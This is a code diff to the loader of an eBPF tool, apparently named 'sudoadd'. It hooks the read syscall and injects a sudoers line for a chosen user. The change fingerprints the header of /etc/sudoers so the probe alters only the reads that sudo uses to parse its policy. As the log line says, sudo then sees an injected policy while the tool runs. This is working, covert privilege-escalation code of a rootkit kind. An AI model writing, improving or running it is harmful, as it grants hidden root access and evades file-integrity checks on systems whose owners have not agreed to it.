@@ -11,7 +11,9 @@ use aya::{
 use log::{info, warn};
 use opentelemetry::{global, KeyValue};
 use opentelemetry_otlp::WithExportConfig;
-use sudoadd_common::Payload;
+use sudoadd_common::{Payload, Sig, SIG_LEN};
+
+const SUDOERS: &str = "/etc/sudoers";
 
 fn init_otel() -> anyhow::Result<opentelemetry_sdk::metrics::SdkMeterProvider> {
     let endpoint = std::env::var("OTEL_EXPORTER_OTLP_ENDPOINT")
@@ -46,16 +48,29 @@ async fn main() -> anyhow::Result<()> {
     let n = b.len().min(64);
     line[..n].copy_from_slice(&b[..n]);
 
+    // Signature: the first bytes of /etc/sudoers. The probe only tampers a read
+    // whose buffer begins with these bytes — i.e. a read of the file header —
+    // which precisely targets the policy parse and can't corrupt library reads.
+    let mut sig = [0u8; SIG_LEN];
+    match std::fs::read(SUDOERS) {
+        Ok(data) if data.len() >= SIG_LEN => sig.copy_from_slice(&data[..SIG_LEN]),
+        _ => {
+            warn!("could not read {SUDOERS} header; falling back to a generic signature");
+            sig[..3].copy_from_slice(b"## ");
+        }
+    }
+
     let mut ebpf = Ebpf::load(aya::include_bytes_aligned!(concat!(env!("OUT_DIR"), "/sudoadd")))?;
     {
         let mut payload: Array<_, Payload> = Array::try_from(ebpf.map_mut("PAYLOAD").unwrap())?;
         payload.set(0, Payload { line, len: n as u32 }, 0)?;
+        let mut sig_map: Array<_, Sig> = Array::try_from(ebpf.map_mut("SIG").unwrap())?;
+        sig_map.set(0, Sig { bytes: sig }, 0)?;
     }
 
-    for name in ["enter_read", "exit_read"] {
+    for (name, tp) in [("enter_read", "sys_enter_read"), ("exit_read", "sys_exit_read")] {
         let prog: &mut TracePoint = ebpf.program_mut(name).unwrap().try_into()?;
         prog.load()?;
-        let tp = if name == "enter_read" { "sys_enter_read" } else { "sys_exit_read" };
         prog.attach("syscalls", tp)?;
     }
     info!("attached — while this runs, sudo sees the injected policy for '{user}'");
